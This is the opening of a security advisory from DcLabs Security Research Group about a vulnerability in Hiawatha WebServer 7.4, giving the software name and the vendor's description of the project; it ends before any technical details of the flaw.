[Discussion]
- DcLabs Security Research Group advises about the following vulnerability(ies):

[Software]
- Hiawatha WebServer 7.4

[Vendor Product Description]
- Hiawatha is an open source webserver with a focus on security. I
started Hiawatha in January 2002. Before that time, I had used several
webservers, but I didn't like them. They had unlogical, almost cryptic
configuration syntax and none of them gave me a good feeling about
their security and robustness. So, I decided it was time to write my
own webserver. I never thought that my webserver would become what it
is today, but I enjoyed working on it and liked to have my own open
source project. In the years that followed, Hiawatha became a fully
functional webserver.
